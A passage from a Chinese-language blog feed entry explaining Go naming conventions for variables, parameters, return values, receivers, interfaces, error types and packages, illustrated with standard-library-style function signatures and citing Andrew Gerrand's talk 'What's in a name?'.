<h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>局部变量应当尽可能短小，譬如使用<code>buf</code>指代<code>buffer</code>，使用<code>i</code>指代<code>index</code><br>在很长的函数中可能会有很多的变量，这个时候可以适当使用一些长名字。<br>但是写出这么长的函数，通常意味着代码需要重构了！🙅🏻‍</p>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>函数的参数和局部变量类似，但是它们默认还具有文档的功能<br>当参数类型具有描述性的时候，参数名就应该尽可能短小：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">AfterFunc</span><span class="params">(d Duration, f <span class="keyword">func</span>()</span>) *<span class="title">Timer</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">func</span> <span class="title">Escape</span><span class="params">(w io.Writer, s []<span class="keyword">byte</span>)</span></span></div></pre></td></tr></table></figure>
<p>当参数类型比较模糊的时候，参数名就应当具有文档的功能：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unix</span><span class="params">(sec, nsec <span class="keyword">int64</span>)</span> <span class="title">Time</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">func</span> <span class="title">HasPrefix</span><span class="params">(s, prefix []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></div></pre></td></tr></table></figure>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>在Go语言中，返回值可以定义名称的，它可以当做一种特殊的参数。<br>尤其重要的是，在外部可见的函数中，返回值的名称应当可以作为文档参考。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Copy</span><span class="params">(dst Writer, src Reader)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">func</span> <span class="title">ScanBytes</span><span class="params">(data []<span class="keyword">byte</span>, atEOF <span class="keyword">bool</span>)</span> <span class="params">(advance <span class="keyword">int</span>, token []<span class="keyword">byte</span>,</span></span></div><div class="line"><span class="function"><span class="params"> err error)</span></span></div></pre></td></tr></table></figure>
<h2 id="方法接收者（Receiver）"><a href="#方法接收者（Receiver）" class="headerlink" title="方法接收者（Receiver）"></a>方法接收者（Receiver）</h2><p>方法接收者也是一种特殊的参数。Go语言中没有明显的面向对象的概念，可以对方法定义方法接收者来实现类似于对象的方法的概念。</p>
<p>按照惯例，由于方法接收者在函数内部经常出现，因此它经常采用一两个字母来标识方法接收者的类型。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Buffer)</span> <span class="title">Read</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">func</span> <span class="params">(sh serverHandler)</span> <span class="title">ServeHTTP</span><span class="params">(rw ResponseWriter, req *Request)</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">func</span> <span class="params">(r Rectangle)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">Point</span></span></div></pre></td></tr></table></figure>
<p>需要注意的是，方法接收者的名字在同一类型的不同方法中应该保持统一，这也是前文所述的一贯性的需求。</p>
<h2 id="导出包级别命名"><a href="#导出包级别命名" class="headerlink" title="导出包级别命名"></a>导出包级别命名</h2><p>导出名被使用的时候通常是放在包名后<br>所以，在导出变量、常数、函数和类型的时候，<br>不要把包名的意义再写一遍</p>
<p>比较好的名字<br><code>bytes.Buffer</code> <code>strings.Reader</code></p>
<p>比较蠢的名字<br><code>bytes.ByteBuffer</code> <code>strings.StringReader</code></p>
<h2 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h2><p>只含有一个方法的接口类型通常以函数名加上<code>er</code>后缀作为名字</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span> &#123;</div><div class="line">    Read(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>有时候可能导致蹩脚的英文，但别管他，能看懂就好</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> Execer <span class="keyword">interface</span> &#123;</div><div class="line">    Exec(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>有时候可以适当调整一下英文单词的顺序，增加可读性：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> ByteReader <span class="keyword">interface</span> &#123;</div><div class="line">    ReadByte(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当接口含有多个方法的时候，还是要选取一个能够精准描述接口目的的名字，譬如<code>net.Conn</code>、<code>http/ResponseWriter</code></p>
<h2 id="Error的命名"><a href="#Error的命名" class="headerlink" title="Error的命名"></a>Error的命名</h2><p>Error类型应该写成FooError的形式</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> ExitError <span class="keyword">struct</span> &#123;</div><div class="line">	....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Error变量协程ErrFoo的形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var ErrFormat = errors.New(&quot;unknown format&quot;)</div></pre></td></tr></table></figure>
<h2 id="包的命名"><a href="#包的命名" class="headerlink" title="包的命名"></a>包的命名</h2><p>应当与它导出代码的内容相关，避免<code>util</code>、<code>common</code>这种宽泛的命名</p>
<h2 id="引入路径"><a href="#引入路径" class="headerlink" title="引入路径"></a>引入路径</h2><p>包路径的最后一个单词应该和包名一致</p>
<p>包路径应该尽可能简洁</p>
<p>记得把库的主要代码直接放在代码库的根目录</p>
<p>避免在包路径中使用任何大写字母（并非所有文件系统都区分大小写）</p>
<h2 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h2><p>上述很多例子都是从标准库中来的</p>
<p>标准库的很多内容都可以作为参考<br>多看看标准库来寻求灵感吧</p>
<p>但是要记住：</p>
<p>当作者写标准库的时候，他们自己也在学习过程中。<br>多数情况下作者是对的，但是偶尔还是会犯一些错误</p>
<p><hr></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://talks.golang.org/2014/names.slide" target="_blank" rel="noopener">What’s in a name? - Andrew Gerrand</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇主要讲述Go语言的命名规范。&lt;br&gt;优秀的代码必须具备良好的可读性，而可读性的关键即在于命名风格。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="go" scheme="http://zablog.me/tags/go/"/>
    
  </entry>
  
</feed>
